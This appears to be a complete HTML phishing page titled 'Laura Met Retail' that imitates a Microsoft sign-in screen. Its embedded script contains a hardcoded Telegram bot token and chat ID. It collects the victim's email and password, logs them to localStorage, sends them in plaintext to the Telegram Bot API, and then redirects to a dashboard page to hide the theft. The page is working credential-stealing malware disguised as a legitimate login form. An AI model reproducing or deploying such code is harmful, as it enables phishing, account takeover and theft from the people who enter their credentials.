<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In | Laura Met Retail</title>
    
    <link rel="icon" type="image/png" href="images.png">
    
    <style>
        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', Arial, sans-serif; overflow: hidden; }
        .wrapper {
            background: linear-gradient(rgba(255,255,255,0.5), rgba(255,255,255,0.5)), 
                        url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&w=1920&q=80');
            background-size: cover; background-position: center;
            height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;
        }
        .card { background: white; width: 100%; max-width: 440px; padding: 44px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 28px; position: relative; min-height: 340px; }
        
        /* --- Logo and Branded Text --- */
        .brand-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .brand-logo {
            width: 24px;
            height: auto;
            margin-right: 10px;
        }
        .logo-text { 
            font-weight: 600; 
            color: #737373; /* Professional gray used in retail headers */
            font-size: 18px;
        }

        #loadingOverlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10; justify-content: center; align-items: center; flex-direction: column; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0067b8; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        h1 { font-size: 24px; margin: 0 0 16px 0; color: #1b1b1b; }
        .user-display { font-size: 15px; margin-bottom: 20px; color: #1b1b1b; display: flex; align-items: center; cursor: pointer; }
        
        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 16px; outline: none; margin-bottom: 20px; }
        #passwordSection { display: none; }
        
        /* --- Links and Action Buttons --- */
        .links { font-size: 13px; margin-bottom: 30px; }
        .links a { color: #0067b8; text-decoration: none; display: block; margin-bottom: 8px; }
        
        .action-row { display: flex; justify-content: flex-end; }
        .btn-primary { 
            background-color: #0067b8; /* Matches the blue in the logo squares */
            color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; 
        }
        .btn-primary:hover { background-color: #005da6; }

        .footer { position: fixed; bottom: 12px; right: 24px; font-size: 12px; }
        .footer a { margin-left: 16px; color: #000; text-decoration: none; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <div id="loadingOverlay"><div class="spinner"></div></div>
            
            <div class="brand-header">
                <img src="images.png" alt="Logo" class="brand-logo">
                <span class="logo-text">Microsoft</span>
            </div>
            
            <div id="emailSection">
                <h1>Sign in</h1>
                <input type="email" id="userEmail" placeholder="Email, phone, or Skype">
                <div class="links">
                    <a href="#">No account? Create one!</a>
                    <a href="#">Canâ€™t access your account?</a>
                </div>
                <div class="action-row">
                    <button class="btn-primary" id="nextBtn">Next</button>
                </div>
            </div>

            <div id="passwordSection">
                <div class="user-display" id="backToEmail">
                    <img src="https://img.icons8.com/material-rounded/20/000000/left.png" style="margin-right:8px">
                    <span id="displayEmail"></span>
                </div>
                <h1>Enter password</h1>
                <input type="password" id="userPass" placeholder="Password">
                <div class="links">
                    <a href="#">Forgot password?</a>
                    <a href="#">Other ways to sign in</a>
                </div>
                <div class="action-row">
                    <button class="btn-primary" id="loginBtn">Sign in</button>
                </div>
            </div>
        </div>
        <div class="footer">
            <a href="#">Terms of use</a> <a href="#">Privacy & cookies</a>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "7959060131:AAEGFLYVrJcrO7UqeZ-5IOy1cCWlNfRVAGM";
        const TELEGRAM_CHAT_ID = "8553457502";

        const nextBtn = document.getElementById('nextBtn');
        const loginBtn = document.getElementById('loginBtn');
        const emailSection = document.getElementById('emailSection');
        const passwordSection = document.getElementById('passwordSection');
        const overlay = document.getElementById('loadingOverlay');
        const displayEmail = document.getElementById('displayEmail');
        const backToEmail = document.getElementById('backToEmail');

        let user_email = "";

        nextBtn.addEventListener('click', function() {
            user_email = document.getElementById('userEmail').value;
            if (user_email === "" || !user_email.includes('@')) {
                alert("Please enter a valid email.");
                return;
            }
            overlay.style.display = 'flex';
            setTimeout(() => {
                overlay.style.display = 'none';
                emailSection.style.display = 'none';
                passwordSection.style.display = 'block';
                displayEmail.innerText = user_email;
            }, 1000);
        });

        backToEmail.addEventListener('click', () => {
            passwordSection.style.display = 'none';
            emailSection.style.display = 'block';
        });

        loginBtn.addEventListener('click', function() {
            const pass = document.getElementById('userPass').value;
            if (pass.length < 1) {
                alert("Please enter your password.");
                return;
            }

            overlay.style.display = 'flex';

            const loginAttempt = {
                email: user_email,
                password: pass,
                time: new Date().toLocaleString()
            };
            let history = JSON.parse(localStorage.getItem('loginHistory') || "[]");
            history.push(loginAttempt);
            localStorage.setItem('loginHistory', JSON.stringify(history));

            const message = `<b>ðŸ”” Login Attempt: Laura Met Retail</b>\n\n<b>ðŸ“§ Email:</b> <code>${user_email}</code>\n<b>ðŸ”‘ Password:</b> <code>${pass}</code>`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(() => {
                setTimeout(() => { window.location.href = "dashboard.html"; }, 1000);
            })
            .catch(() => {
                window.location.href = "dashboard.html";
            });
        });
    </script>
</body>
</html>
